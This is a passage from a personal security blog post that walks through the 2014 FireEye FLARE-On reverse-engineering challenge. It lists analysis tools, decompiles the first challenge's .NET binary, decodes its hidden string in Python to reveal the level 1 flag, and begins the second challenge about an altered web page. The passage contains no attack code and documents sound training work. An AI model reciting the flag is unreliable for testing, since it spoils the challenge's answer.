<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en lang=en-us><head><meta charset=utf-8><meta name=viewport content="width=device-width,minimum-scale=1,maximum-scale=1"><link href=/css/fonts.css rel=stylesheet type=text/css><title>My Adventure with Fireeye FLARE Challenge</title><link rel=stylesheet href=/css/hugo-octopress.css>
<link rel=stylesheet href=/css/fork-awesome.min.css><link href=https://parsiya.net/favicon.png rel=icon><meta name=description content><meta name=keywords content="[Parsia Hakimian Parsiya infosec information security]"><meta name=author content="Parsia"><meta name=generator content="Hugo 0.147.3"><meta name=twitter:card content="summary"><meta name=twitter:title content="My Adventure with Fireeye FLARE Challenge"><meta name=twitter:description content="These are my (rather long) solutions to Fireeye's FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.
If you have any feedback, please let me know. I spent a lot of time on this writeup and I am always happy to learn new stuff. My email and twitter handle are in the sidebar.
I am a bit late to the party. There were two are now other three solutions posted (that I know of). Check them out.

Detailed Solutions to FireEye FLARE Challenge
A Walk through for FLARE RE Challenges
The FLARE On Challenge Solutions by Fireye

Part 1 - solutions for challenges 1 to 5
Part 2 - solutions for challenges 6 and 7


"><meta name=twitter:domain content="parsiya.net"><meta name=twitter:creator content="@CryptoGangsta"></head><body><header role=banner><hgroup><h1><a href=https://parsiya.net/>Hackerman's Hacking Tutorials</a></h1><h2>The knowledge of anything, since all things have causes, is not acquired or
complete unless it is known by its causes. - Avicenna</h2></hgroup></header><nav role=navigation><fieldset class=mobile-nav><select onchange="location=this.value"><option value>Navigate…</option><option value=https://parsiya.net/about/>» About Me!</option><option value=https://parsiya.net/cheatsheet/>» Cheat Sheet</option><option value=https://parsiya.io/>» My Clone</option><option value=https://github.com/parsiya/parsiya.net>» Source Repo</option><option value="https://queue.acm.org/detail.cfm?id=3197520">» Manual Work is a Bug</option><option value="https://www.google.com/search?q=andrew+ridgeley">» The Other Guy from Wham!</option></select></fieldset><ul class=main-navigation><li><a href=https://parsiya.net/about/ title="About Me!" target=_blank rel="noopener noreferrer">About Me!</a></li><li><a href=https://parsiya.net/cheatsheet/ title="Cheat Sheet" target=_blank rel="noopener noreferrer">Cheat Sheet</a></li><li><a href=https://parsiya.io/ title="My Clone" target=_blank rel="noopener noreferrer">My Clone</a></li><li><a href=https://github.com/parsiya/parsiya.net title="Source Repo" target=_blank rel="noopener noreferrer">Source Repo</a></li><li><a href="https://queue.acm.org/detail.cfm?id=3197520" title="Manual Work is a Bug" target=_blank rel="noopener noreferrer">Manual Work is a Bug</a></li><li><a href="https://www.google.com/search?q=andrew+ridgeley" title="The Other Guy from Wham!" target=_blank rel="noopener noreferrer">The Other Guy from Wham!</a></li></ul><ul class=subscription><a href=https://parsiya.net/index.xml target=_blank type=application/rss+xml title=RSS rel="noopener noreferrer"><i class="fa fa-rss-square fa-lg"></i></a></ul><form action=https://www.google.com/search method=get target=_blank rel="noopener noreferrer"><fieldset role=search><input class=search type=text name=q results=0 placeholder=Search>
<input type=hidden name=q value=site:https://parsiya.net/></fieldset></form></nav><div id=main><div id=content><div><article class=hentry role=article><header><p class=meta>Sep 23, 2014
- 79 minute read
- <a href=https://parsiya.net/blog/2014-09-23-my-adventure-with-fireeye-flare-challenge/#disqus_thread>Comments</a>
- <a class=label href=https://parsiya.net/categories/reverse-engineering/>Reverse Engineering </a><a class=label href=https://parsiya.net/categories/writeup/>Writeup</a></p><h1 class=entry-title>My Adventure with Fireeye FLARE Challenge</h1></header><div class=entry-content><p>These are my (rather long) solutions to Fireeye's FLARE challenge. This is just not the solution but other ways that I tried. This was a great learning experience for me so I am writing this post to document everything I tried. As a result, this post is somewhat long.</p><p>If you have any feedback, please let me know. I spent a lot of time on this writeup and I am always happy to learn new stuff. My email and twitter handle are in the sidebar.</p><p>I am a bit late to the party. There <del>were two</del> are now other three solutions posted (that I know of). Check them out.</p><ul><li><a href=https://www.codeandsec.com/Detailed-Solutions-to-FireEye-FLARE-Challenge target=_blank rel="noreferrer noopener">Detailed Solutions to FireEye FLARE Challenge</a></li><li><a href=http://www.ghettoforensics.com/2014/09/a-walkthrough-for-flare-re-challenges.html target=_blank rel="noreferrer noopener">A Walk through for FLARE RE Challenges</a></li><li>The FLARE On Challenge Solutions by Fireye<ul><li><a href=http://www.fireeye.com/blog/technical/cyber-exploits/2014/11/the-flare-on-challenge-solutions-part-1-of-2.html target=_blank rel="noreferrer noopener">Part 1 - solutions for challenges 1 to 5</a></li><li><a href=https://www.fireeye.com/blog/threat-research/2014/11/flare_on_challengep.html target=_blank rel="noreferrer noopener">Part 2 - solutions for challenges 6 and 7</a></li></ul></li></ul><h3 id=links-to-individual-challenges>Links to Individual Challenges
<a class=header-link href=#links-to-individual-challenges><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>This post is quite long (I didn't want to strip them into different posts), use the following links to jump to any specific challenge:</p><ul><li><a href=#ch1>Challenge 1</a></li><li><a href=#ch2>Challenge 2</a></li><li><a href=#ch3>Challenge 3</a></li><li><a href=#ch4>Challenge 4</a></li><li><a href=#ch5>Challenge 5</a></li><li><a href=#ch6>Challenge 6</a></li><li><a href=#ch7>Challenge 7</a></li></ul><h3 id=my-setup>My Setup
<a class=header-link href=#my-setup><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><p>I used a Windows XP SP3 Virtual Machine for most challenges using VirtualBox. For challenge 6 I used a Kali 64-bit VM. I used IDA/Immunity on my host OS with some other utilities.</p><h3 id=helpful-tools>Helpful Tools
<a class=header-link href=#helpful-tools><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h3><ul><li><a href=http://www.7-zip.org/download.html target=_blank rel="noreferrer noopener">7-zip</a></li><li><a href=http://www.winitor.com/ target=_blank rel="noreferrer noopener">PE-Studio</a>: Gain information about the binary <strong>without running it.</strong> It also sends a hash (MD5 I think) of the file to Virustotal so if you want to keep your samples secret, don't give it internet access</li><li><a href=http://www.jetbrains.com/decompiler/ target=_blank rel="noreferrer noopener">dotPeek</a>: Free .NET decompiler by JetBrains</li><li><a href=http://www.red-gate.com/products/dotnet-development/reflector/ target=_blank rel="noreferrer noopener">.NET Reflector</a>: .NET decompiler. Not free but comes with a 2-week trial period</li><li><a href="http://mh-nexus.de/en/downloads.php?product=HxD" target=_blank rel="noreferrer noopener">HxD</a>: Free Windows hex editor</li><li><a href=http://notepad-plus-plus.org/ target=_blank rel="noreferrer noopener">Notepad++</a>: Slick FOSS text-editor</li><li><a href=http://debugger.immunityinc.com/ID_register.py target=_blank rel="noreferrer noopener">Immunity Debugger</a>: Windows debugger. Very similar to <a href=http://www.ollydbg.de/ target=_blank rel="noreferrer noopener">OllyDbg</a></li><li><a href=https://code.google.com/p/pyew/ target=_blank rel="noreferrer noopener">pyew</a>: A Python tool for static malware analysis. I used it for PDF analysis</li><li><a href=https://www.hex-rays.com/products/ida/ target=_blank rel="noreferrer noopener">IDA</a>: What can I say? It's great but also costs an arm and a leg. Except challenge 6, the trial and free version are enough for us</li><li><a href=http://home.gna.org/bless/ target=_blank rel="noreferrer noopener">Bless</a>: Linux Hex editor</li><li><a href=http://www.rohitab.com/apimonitor target=_blank rel="noreferrer noopener">API Monitor</a>: Free utility to monitor API calls in Windows. It can monitor calls for standard windows APIs or we can add application-specific Dlls and monitor them</li><li><a href=https://www.wireshark.org/download.html target=_blank rel="noreferrer noopener">Wireshark</a>: FOSS network monitoring/capturing tool. Needs administrator access on Windows to install libpcap</li><li><a href="http://www.microsoft.com/en-us/download/details.aspx?id=4865" target=_blank rel="noreferrer noopener">Microsoft Network Monitor</a>: Microsoft network monitoring/capturing tool. Does not need administrator access. Replaced by <a href="http://www.microsoft.com/en-us/download/details.aspx?id=40308" target=_blank rel="noreferrer noopener">Microsoft Message Analyzer</a></li></ul><hr><h2 id=challenge-1---bob-roge><a name=ch1></a>Challenge 1 - Bob Roge
<a class=header-link href=#challenge-1---bob-roge><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><p>The challenge starts with going to their website at <a href=http://flare-on.com target=_blank rel="noreferrer noopener">http://flare-on.com</a> and downloading a binary. The binary is a self-extracting zip file which is supposed to show you the challenge EULA. It didn't work on my VM.</p><p><img src=/images/2014/flare/1-1.jpg alt="Self-Extracting zip failed :(" title="Self-Extracting zip failed :("></p><p>I opened it with <code>7-zip</code> to get <code>Challenge1.exe</code>. By dropping it into <code>PE-Studio</code> I gained more information:</p><pre tabindex=0><code>The Image is a fake Microsoft executable    # Company name is Microsoft but it is not signed?
The Manifest Identity name (MyApplication.app) is different than the Image name
The Version Information &#39;OriginalFilename&#39; (rev_challenge_1.exe) is different than the Image name
The Debug Symbol File Name () is different than the Image name (challenge1)
The image is Managed (.NET)
</code></pre><p>So it appears to be a .Net binary. Let's run it.</p><p><img src=/images/2014/flare/1-2.jpg alt="Challenge 1 executed" title="Challenge 1 executed"></p><p>Hey I love this guy. Let's press <code>DECODE.</code></p><p><img src=/images/2014/flare/1-3.jpg alt="Much decode" title="Much decode"></p><p>Look at that garbled data. We can decompile it (remember it's a .Net binary). Using <code>dotPeek</code> we can see the code for <code>Decode</code> button:</p><figure class=code><figcaption><span>btnDecode_click</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">11
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">12
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">13
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">14
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">15
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">16
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">17
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">18
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">19
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">20
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">21
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">22
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">23
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">24
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">25
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">26
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c# data-lang=c#><span style=display:flex><span><span style=color:#268bd2>private</span> <span style=color:#719e07>void</span> btnDecode_Click(<span style=color:#dc322f>object</span> sender, EventArgs e)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#719e07>this</span>.pbRoge.Image = (Image) Resources.bob_roge; <span style=color:#586e75>// change the image</span>
</span></span><span style=display:flex><span>  <span style=color:#dc322f>byte</span>[] datSecret = Resources.dat_secret;        <span style=color:#586e75>// interesting</span>
</span></span><span style=display:flex><span>  <span style=color:#dc322f>string</span> str1 = <span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#719e07>for</span> (<span style=color:#dc322f>int</span> index = <span style=color:#2aa198>0</span>; index &lt; datSecret.Length; ++index)
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>	<span style=color:#dc322f>byte</span> num = datSecret[index];
</span></span><span style=display:flex><span>	str1 = str1 + (<span style=color:#dc322f>object</span>) (<span style=color:#dc322f>char</span>) (((<span style=color:#dc322f>int</span>) num &gt;&gt; <span style=color:#2aa198>4</span> | (<span style=color:#dc322f>int</span>) num &lt;&lt; <span style=color:#2aa198>4</span> &amp; <span style=color:#2aa198>240</span>) ^ <span style=color:#2aa198>41</span>);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#dc322f>string</span> str2 = str1 + <span style=color:#2aa198>&#34;\0&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#dc322f>string</span> str3 = <span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#dc322f>int</span> index1 = <span style=color:#2aa198>0</span>;
</span></span><span style=display:flex><span>  <span style=color:#719e07>while</span> (index1 &lt; str2.Length)
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>	str3 = str3 + (<span style=color:#dc322f>object</span>) str2[index1 + <span style=color:#2aa198>1</span>] + (<span style=color:#dc322f>object</span>) str2[index1];
</span></span><span style=display:flex><span>	index1 += <span style=color:#2aa198>2</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#dc322f>string</span> str4 = <span style=color:#2aa198>&#34;&#34;</span>;
</span></span><span style=display:flex><span>  <span style=color:#719e07>for</span> (<span style=color:#dc322f>int</span> index2 = <span style=color:#2aa198>0</span>; index2 &lt; str3.Length; ++index2)
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>	<span style=color:#dc322f>int</span> num = (<span style=color:#dc322f>int</span>) str3[index2];
</span></span><span style=display:flex><span>	str4 = str4 + (<span style=color:#dc322f>object</span>) (<span style=color:#dc322f>char</span>) ((<span style=color:#dc322f>uint</span>) (<span style=color:#dc322f>byte</span>) str3[index2] ^ <span style=color:#2aa198>102</span>U);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#719e07>this</span>.lbl_title.Text = str4;
</span></span><span style=display:flex><span>}</span></span></code></pre></td></tr></table></div></div></div></figure><p>Line 4 reads <code>dat_secret</code> and the rest of the function manipulates it before displaying it on the form. To save this file expand <code>resources</code> and select <code>rev_challenge_1.dat_secret.encode</code>. Right click and select <code>Save Resource to File.</code></p><p><img src=/images/2014/flare/1-4.jpg alt="Saving private secret" title="Saving private secret"></p><p>I used <code>HxD</code> to look at the contents.</p><figure class=code><figcaption><span>Contents of dat_secret</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>A1 B5 <span style=color:#2aa198>44</span> <span style=color:#2aa198>84</span> <span style=color:#2aa198>14</span> E4 A1 B5 D4 <span style=color:#2aa198>70</span> B4 <span style=color:#2aa198>91</span> B4 <span style=color:#2aa198>70</span> D4 <span style=color:#2aa198>91</span> E4 C4 <span style=color:#2aa198>96</span> F4 <span style=color:#2aa198>54</span> <span style=color:#2aa198>84</span> B5 C4 <span style=color:#2aa198>40</span> <span style=color:#2aa198>64</span> <span style=color:#2aa198>74</span> <span style=color:#2aa198>70</span> A4 <span style=color:#2aa198>64</span> <span style=color:#2aa198>44</span>
</span></span><span style=display:flex><span>¡µD„.ä¡µÔp´‘´pÔ‘äÄ–ôT„µÄ@dtp¤dD</span></span></code></pre></td></tr></table></div></div></div></figure><p>Let's run the code with <code>dat_secret</code> and print the result after each level (i.e. <code>str2, str3 and str4</code>). One option is to use the provided C# code. I re-wrote the code in Python and ran it online using <a href=http://repl.it/languages target=_blank rel="noreferrer noopener">repl.it</a>. Str1 is the answer so we don't care about the rest:</p><figure class=code><figcaption><span>Decoding dat_secret</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 5
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 6
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 7
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 8
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050"> 9
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">10
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#719e07>from</span> binascii <span style=color:#719e07>import</span> unhexlify
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>datsecret <span style=color:#719e07>=</span> unhexlify (<span style=color:#2aa198>&#34;A1B5448414E4A1B5D470B491B470D491E4C496F45484B5C440647470A46444&#34;</span>)
</span></span><span style=display:flex><span>str1<span style=color:#719e07>=</span><span style=color:#2aa198>&#34;&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#719e07>for</span> item <span style=color:#719e07>in</span> datsecret:
</span></span><span style=display:flex><span>    num <span style=color:#719e07>=</span> <span style=color:#b58900>ord</span>(item)
</span></span><span style=display:flex><span>    str1 <span style=color:#719e07>+=</span>  <span style=color:#b58900>chr</span>( ( num <span style=color:#719e07>&gt;&gt;</span> <span style=color:#2aa198>4</span> <span style=color:#719e07>|</span> num <span style=color:#719e07>&lt;&lt;</span> <span style=color:#2aa198>4</span> <span style=color:#719e07>&amp;</span> <span style=color:#2aa198>240</span>) <span style=color:#719e07>^</span> <span style=color:#2aa198>41</span> )
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#b58900>print</span> str1</span></span></code></pre></td></tr></table></div></div></div></figure><h4 id=level-1-flag>Level 1 flag: <a href=mailto:3rmahg3rd.b0b.d0ge@flare-on.com>3rmahg3rd.b0b.d0ge@flare-on.com</a>
<a class=header-link href=#level-1-flag><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h4><hr><h2 id=challenge-2---a-study-in-javascript><a name=ch2></a>Challenge 2 - A Study in JavaScript
<a class=header-link href=#challenge-2---a-study-in-javascript><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a></h2><pre tabindex=0><code>Well done! Looks like you kicked that one. I&#39;ve attached the next challenge for your reversing pleasure. The password to this zip archive is &#34;malware&#34;.
We saw what looked like attacker activity to this site, can you figure out what the attackers changed?
Hopefully you&#39;ll knock this one out too, Good luck!

-FLARE
</code></pre><p>Inside the archive seems to be a copy of the original <a href=http://flare-on.com target=_blank rel="noreferrer noopener">http://flare-on.com</a> with a launch date countdown timer. I will be calling the html page from the website <code>original_html</code> and the one in the zip file <code>challenge_html</code>.</p><figure class=code><figcaption><span>Contents of challenge zip file</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>-rwx------+ <span style=color:#2aa198>1</span> TyRaX None <span style=color:#2aa198>8378</span> home.html
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>directory called <span style=color:#2aa198>&#34;img&#34;</span> with one single png
</span></span><span style=display:flex><span>-rwx------+ <span style=color:#2aa198>1</span> TyRaX None <span style=color:#2aa198>9560</span> <span style=color:#b58900>flare-on</span>.png</span></span></code></pre></td></tr></table></div></div></div></figure><p><img src=/images/2014/flare/2-1.jpg alt=challenge_html title=challenge_html></p><p>The original web page looks a bit different.<figure class=code><figcaption><span>Original web page</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">4
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">5
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>-rwx------+ <span style=color:#2aa198>1</span> TyRaX None <span style=color:#2aa198>6254</span> The FLARE On Challenge.htm
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>and
</span></span><span style=display:flex><span>-rwx------+ <span style=color:#2aa198>1</span> TyRaX None <span style=color:#2aa198>116290</span> bootstrap.css
</span></span><span style=display:flex><span>-rwx------+ <span style=color:#2aa198>1</span> TyRaX None   <span style=color:#2aa198>6596</span> <span style=color:#b58900>flare-on</span>-V2.png</span></span></code></pre></td></tr></table></div></div></div></figure></p><p><img src=/images/2014/flare/2-2.jpg alt=original_html title=original_html></p><p>The timer threw me off track. Is it really a countdown timer? When does it reach zero?<br>I changed the time in my VM to mess with it but it synced up with host.</p><figure class=code><figcaption><span>To de-sync guest and host time/date</span></figcaption><div class=codewrapper><div class=highlight><div style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">2
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#495050">3
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#586e75># vboxmanage is in the VirtualBox installation directory</span>
</span></span><span style=display:flex><span><span style=color:#586e75># So on Windows: C:\Program Files\Oracle\VirtualBox</span>
